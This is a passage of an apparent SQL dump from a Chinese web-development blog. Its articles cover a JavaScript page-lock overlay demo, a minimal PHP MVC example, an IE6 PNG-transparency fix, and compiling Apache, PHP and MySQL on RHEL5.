/>\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} else {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;obj.removeEventListener(type, fn, false);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;// 阻止浏览器默认行为<br />\r\n&nbsp;&nbsp; &nbsp;var stopDefault = function(e){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;e.preventDefault ? e.preventDefault() : e.returnValue = false;<br />\r\n&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;// 获取页面滚动条位置<br />\r\n&nbsp;&nbsp; &nbsp;var getPage = function(){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var dd = document.documentElement,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;db = document.body;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;left: Math.max(dd.scrollLeft, db.scrollLeft),<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;top: Math.max(dd.scrollTop, db.scrollTop)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;// 锁屏<br />\r\n&nbsp;&nbsp; &nbsp;var lock = {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;show: function(){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(&#39;pageOverlay&#39;).style.visibility = &#39;visible&#39;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var p = getPage(),<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;left = p.left,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;top = p.top;</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;// 页面鼠标操作限制<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;this.mouse = function(evt){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var e = evt || window.event;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stopDefault(e);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;scroll(left, top);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;each([&#39;DOMMouseScroll&#39;, &#39;mousewheel&#39;, &#39;scroll&#39;, &#39;contextmenu&#39;], function(o, i) {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;bind(document, o, lock.mouse);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;});<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;// 屏蔽特定按键: F5, Ctrl + R, Ctrl + A, Tab, Up, Down<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;this.key = function(evt){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var e = evt || window.event,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;key = e.keyCode;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if((key == 116) || (e.ctrlKey &amp;&amp; key == 82) || (e.ctrlKey &amp;&amp; key == 65) || (key == 9) || (key == 38) || (key == 40)) {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;e.keyCode = 0;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}catch(_){};<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stopDefault(e);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;bind(document, &#39;keydown&#39;, lock.key);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;},<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;close: function(){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(&#39;pageOverlay&#39;).style.visibility = &#39;hidden&#39;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;each([&#39;DOMMouseScroll&#39;, &#39;mousewheel&#39;, &#39;scroll&#39;, &#39;contextmenu&#39;], function(o, i) {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;unbind(document, o, lock.mouse);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;});<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;unbind(document, &#39;keydown&#39;, lock.key);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;bind(window, &#39;load&#39;, function(){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(&#39;btn_lock&#39;).onclick = function(){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;lock.show();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(&#39;pageOverlay&#39;).onclick = function(){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;lock.close();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;});<br />\r\n})();<br />\r\n&lt;/script&gt;<br />\r\n&lt;/head&gt;<br />\r\n&lt;body&gt;<br />\r\n&lt;button id=&quot;btn_lock&quot; style=&quot;position: absolute; left:50%; top:40%; &quot;&gt;开启锁屏&lt;/button&gt;<br />\r\n&lt;ol id=&quot;test&quot;&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;/ol&gt;<br />\r\n&lt;div id=&quot;pageOverlay&quot;&gt;&lt;/div&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n',0,1429432667,0,0),(14,12,'浅解用PHP实现MVC','<p>传统的面相过程式的开发方式在处理中型以上的应用时，就开始显得力不从心。即便我们能够快速的完成需求，但是在需求发生变更后或者进行后期维护的时候，我们会深深地陷入我们早期搭建的陷阱中。所以，使用面向对象的方式来实现MVC模式，将为我们梳理程序的架构提供一个清晰的思路。</p>\r\n\r\n<p>什么是MVC？</p>\r\n\r\n<p>关于MVC的定义和解释，可以说多种多样。我们可以在Wiki或者[2]中找到更为详尽的解释，这里我并不打算，也没有能力进行深入的讲解，从PHP开发的角度来讲，MVC可以概括为：</p>\r\n\r\n<p>视图(The View)：</p>\r\n\r\n<p>一说到视图，我们很多人都会想到模板引擎(诸如Smarty等等)。其实就是各种各样的输出，比如说html模板和Javascript文件等。</p>\r\n\r\n<p>模块(The Model)：</p>\r\n\r\n<p>模块代表了程序的逻辑，在企业应用中通常称为业务逻辑层。一般来讲，这一层完成的工作是把原始的数据处理成按照我们设计的数据结构存储的有意义的数据序列，并将这些数据交给视图去处理。通常情况下， 模块中会利用一个数据抽象类来进行与数据操作有关的处理。<br />\r\nModel通常包含了哪些用来同数据库打交道的函数。</p>\r\n\r\n<p>控制器(The Controller)：</p>\r\n\r\n<p>控制器使所有WEB应用的第一站，他接受收到的参数，比如$_GET变量，然后做出相应的反应。</p>\r\n\r\n<p>关于MVC的是否适合PHP的争论也很多，人们不断的讨论MVC是否适合PHP[3]，现在也已经有了很多的MVC框架，诸如PHP MVC Frameworks中列出的[4]。那么，为什么人们这么热衷于MVC，我们为什么要使用MVC在我们的设计中呢。</p>\r\n\r\n<p>为什么用MVC？</p>\r\n\r\n<p>MVC最早是用来解决桌面GUI的编程问题，最早的MVC框架应该是Sun在1999年提出的Model 2，后来演变成了Struts。MVC带给人们深刻的印象，但是我们在使用的过程中，却并没有认真的想过为什么使用MVC。<br />\r\n在传统的桌面应用中，一旦Model中有时间发生，我们可以主动的让View界面进行刷新，从而展示后台发生的变化。而在Web应用中，我们似乎限于传统的Http的Request/Response的方式，我们似乎没有办法让用户端进行更新。这一段讨论，并不是认为MVC不能够用来进行WEB应用的开发，而是觉得从某种程度上来说，他还不是最合适的。<br />\r\n关于使用MVC的争论还有很多[1]，但是相信所有习惯了使用MVC来组织自己的项目的人，让他选择一个新的项目构架时，一定不会放弃MVC。</p>\r\n\r\n<p>如何实现MVC？</p>\r\n\r\n<p>下面是一个超级简单的MVC结构实现，甚至连数据源都用了一个内置的固定数组，虽然简单，但其实众多的PHP Framework核心实现的思想应该和这个是差不多的，只不过一些framework提供了更多的方便开发者使用的工具，我也想自己来实现一个PHP的框架，目前正在着手策划中，也希望自己能够从框架的开发中学习到更多的PHP设计思想和方法。</p>\r\n\r\n<p>Controller.php</p>\r\n\r\n<p>include &#39;Model.php&#39;;<br />\r\ninclude &#39;View.php&#39;;<br />\r\nclass Controller {<br />\r\n&nbsp;&nbsp; &nbsp;private $model = &#39;&#39;;<br />\r\n&nbsp;&nbsp; &nbsp;private $view&nbsp; = &#39;&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;public function Controller(){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$this-&gt;model = new Model();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$this-&gt;view&nbsp; = new View();<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;public function doAction( $method = &#39;defaultMethod&#39;, $params = array() ){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if( empty($method) ){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$this-&gt;defaultMethod();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}else if( method_exists($this, $method) ){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;call_user_func(array($this, $method), $params);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}else{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$this-&gt;nonexisting_method();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;public function link_page($name = &#39;&#39;){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$links = $this-&gt;model-&gt;getLinks();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$this-&gt;view-&gt;display($links);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$result = $this-&gt;model-&gt;getResult($name);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$this-&gt;view-&gt;display($result);<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;public function defaultMethod(){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$this-&gt;br();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;echo &quot;This is the default method. &quot;;<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;public function nonexisting_method(){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$this-&gt;br();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;echo &quot;This is the noexisting method. &quot;;<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;public function br(){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;echo &quot;&lt;br /&gt;&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n}<br />\r\n$controller = new Controller();<br />\r\n$controller-&gt;doAction(&#39;link_page&#39;, &#39;b&#39;);<br />\r\n$controller-&gt;doAction();</p>\r\n\r\n<p>Model.php</p>\r\n\r\n<p>class Model {<br />\r\n&nbsp;&nbsp; &nbsp;private $database = array(<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&quot;a&quot;&nbsp;&nbsp;&nbsp; =&gt;&nbsp;&nbsp;&nbsp; &quot;hello world&quot;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&quot;b&quot;&nbsp;&nbsp;&nbsp; =&gt;&nbsp;&nbsp;&nbsp; &quot;ok well done&quot;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&quot;c&quot;&nbsp;&nbsp;&nbsp; =&gt;&nbsp;&nbsp;&nbsp; &quot;good bye&quot;<br />\r\n&nbsp;&nbsp; &nbsp;);</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;//@TODO connect the database</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;//run the query and get the result<br />\r\n&nbsp;&nbsp; &nbsp;public function getResult($name){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if( empty($name) ){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return FALSE;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if( in_array($name, array_keys( $this-&gt;database ) ) ){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return $this-&gt;database[$name];<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;public function getLinks(){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$links = &quot;&lt;a href=&#39;#&#39;&gt;Link A&lt;/a&gt;&amp;nbsp;&amp;nbsp;&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$links.= &quot;&lt;a href=&#39;#&#39;&gt;Link B&lt;/a&gt;&amp;nbsp;&amp;nbsp;&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$links.= &quot;&lt;a href=&#39;#&#39;&gt;Link C&lt;/a&gt;&amp;nbsp;&amp;nbsp;&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return $links;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n}</p>\r\n\r\n<p>view.php</p>\r\n\r\n<p>class View {<br />\r\n&nbsp;&nbsp; &nbsp;public function display($output){<br />\r\n&nbsp;&nbsp; &nbsp;//ob_start();<br />\r\n&nbsp;&nbsp; &nbsp;echo $output;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n}</p>\r\n',0,1429433278,0,0),(15,1,'ie6中png图片不透明解决方法','<p>今天介绍DD_belatedPNG,只需要一个理由,就是它支持backgrond-position与background-repeat.这是其他js插件不具备的。</p>\r\n\r\n<p>我们知道IE6是不支持透明的PNG的,这无疑限制了网页设计的发挥空间.<br />\r\n然而整个互联网上解决这个IE6的透明PNG的方案也是多不胜数,从使用IE特有的滤镜或是e&shy;xpression,再到javascript+透明GIF替代.但是这些方法都有一个缺点,就是不支持CSS中backgrond-position与background-repeat</p>\r\n\r\n<p>而我今天介绍DD_belatedPNG,只需要一个理由,就是它支持backgrond-position与background-repeat.这是其他js插件不具备的.同时DD_belatedPNG还支持a:hover属性,以及&lt;img&gt;</p>\r\n\r\n<p>原理<br />\r\n这个js插件使用了微软的VML语言进行绘制,而其他多数解决PNG问题的js插件用的是AlphaImageLoader滤镜</p>\r\n\r\n<p>使用方法<br />\r\n1.下载DD_belatedPNG.js文件.<br />\r\n2.在网页中引用,如下:<br />\r\n&lt;!--[if lte IE 6]&gt;<br />\r\n&lt;script src=&quot;Js/DD_belatedPNG_0.0.8a.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;<br />\r\n&lt;script type=&quot;text/javascript&quot;&gt;<br />\r\nDD_belatedPNG.fix(&#39;div, ul, img, li, input , a, .png_bg&#39;);<br />\r\n/* 将 .png_bg 改成你应用了透明PNG的CSS选择器*/<br />\r\n&lt;/script&gt;<br />\r\n&lt;![endif]--&gt;<br />\r\n3.有2种调用函数,一种是DD_belatedPNG.fix(),如上代码.另一种是fix(),这中方法需要在函数内指出css选择器名</p>\r\n\r\n<p>使用a:hover请留意<br />\r\n5-25更新:如果你也像jutoy同学一样想要用透明PNG作为a:hover时的背景图片,那么你需要留意你的代码,需要以&rdquo;a:hover&rdquo;来作为选择器.否则可能会导致无法成功.同时我也更新了demo,请需要的更新查看.接着我们看看正确的代码:<br />\r\n&lt;!--[if IE 6]&gt;<br />\r\n&lt;script type=&quot;text/javascript&quot; src=&quot;js/DD_belatedPNG.js&quot; &gt;&lt;/script&gt;<br />\r\n&lt;script type=&quot;text/javascript&quot;&gt;<br />\r\nDD_belatedPNG.fix(&#39;.trans,.box a:hover&#39;);<br />\r\n&lt;/script&gt;<br />\r\n&lt;![endif]--&gt;</p>\r\n',1,1429439341,0,0),(16,15,'RHEL5下apache+php+mysql编译安装','<p>操作系统: RHEL5</p>\r\n\r\n<p>apache: apache-2.4.6</p>\r\n\r\n<p>php: php-5.5.4</p>\r\n\r\n<p>mysql: mysql-5.6.14</p>\r\n\r\n<p>apr: apr-1.4.8</p>\r\n\r\n<p>apr-util: apr-util-1.5.2</p>\r\n\r\n<p>cmake: cmake-2.8.11.2</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>具体步骤:</p>\r\n\r\n<p>1)安装apr:</p>\r\n\r\n<p>进入apr目录</p>\r\n\r\n<p>./configure --prefix=/usr/apr</p>\r\n\r\n<p>make</p>\r\n\r\n<p>make install</p>\r\n\r\n<p>2)安装apr-util:</p>\r\n\r\n<p>进入apr-util目录</p>\r\n\r\n<p>./configure --prefix=/usr/apr-util --with-apr=/usr/apr</p>\r\n\r\n<p>make</p>\r\n\r\n<p>make install</p>\r\n\r\n<p>3)安装cmake</p>\r\n\r\n<p>进入cmake目录</p>\r\n\r\n<p>./configure --prefix=/usr/cmake</p>\r\n\r\n<p>make</p>\r\n\r\n<p>make install</p>\r\n\r\n<p>4)安装apache</p>\r\n\r\n<p>4.1)安装apache</p>\r\n\r\n<p>进入apache目录</p>\r\n\r\n<p>./configure --prefix=/usr/httpd --enable-so --enable-mods-shared=most --with-mpm=worker --with-apr=/usr/apr --with-apr-util=/usr/apr-util</p>\r\n\r\n<p>make</p>\r\n\r\n<p>make install</p>\r\n\r\n<p>4.2)将apache加入系统服务</p>\r\n\r\n<p>cp /usr/httpd/bin/apachectl /etc/init.d/httpd</p>\r\n\r\n<p>进入/etc/init.d目录编辑httpd</p>\r\n\r\n<p>vi httpd</p>\r\n\r\n<p>在第一行下面添加下面2行</p>\r\n\r\n<p>#chkconfig:345 61 61</p>\r\n\r\n<p>#description:APACHE</p>\r\n\r\n<p>给httpd执行权限</p>\r\n\r\n<p>chmod 777 httpd</p>\r\n\r\n<p>添加进系统服务</p>\r\n\r\n<p>chkconfig --add httpd</p>\r\n\r\n<p>添加进启动项</p>\r\n\r\n<p>chkconfig httpd on</p>\r\n\r\n<p>5)安装mysql</p>\r\n\r\n<p>5.1)安装mysql</p>\r\n\r\n<p>进入mysql目录</p>\r\n\r\n<p>groupadd mysql</p>\r\n\r\n<p>useradd -r -g mysql mysql</p>\r\n\r\n<p>/usr/cmake/bin/cmake -DCMAKE_INSTALL_PREFIX=/usr/mysql</p>\r\n\r\n<p>make</p>\r\n\r\n<p>make install</p>\r\n\r\n<p>cp support-files/mysql.server /etc/init.d/mysqld</p>\r\n\r\n<p>chmod 777 /etc/init.d/mysqld&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (777也可改成755)</p>\r\n\r\n<p>chmod 777 scripts/mysql_install_db</p>\r\n\r\n<p>scripts/mysql_install_db --user=mysql --basedir=/usr/mysql --database=/usr/mysql/data</p>\r\n\r\n<p>5.2)将mysql加入系统服务</p>\r\n\r\n<p>chkconfig --add mysqld</p>\r\n\r\n<p>chkconfig mysqld on</p>\r\n\r\n<p>6)安装php</p>\r\n\r\n<p>6.1)安装php</p>\r\n\r\n<p>进入php目录</p>\r\n\r\n<p>./configure --prefix=/usr/php --with-mysql=/usr/mysql --with-apxs2=/usr/httpd/bin/apxs --with-config-file-path=/usr/php/etc --with-gd</p>\r\n\r\n<p>make</p>\r\n\r\n<p>make install</p>\r\n\r\n<p>cp php.ini-production /usr/php/etc/php.ini&nbsp; 这里目录是否对？</p>\r\n\r\n<p>6.2)让php支持mysqli扩展</p>\r\n\r\n<p>cd ext/mysqli</p>\r\n\r\n<p>/usr/php/bin/phpize&nbsp;&nbsp; 生成configure文件</p>\r\n\r\n<p>./configure --prefix=/usr/php/ext/mysqli --with-php-config=/usr/php/bin/php-config --with-mysqli=/usr/mysql/bin/mysql_config</p>\r\n\r\n<p>make</p>\r\n\r\n<p>make 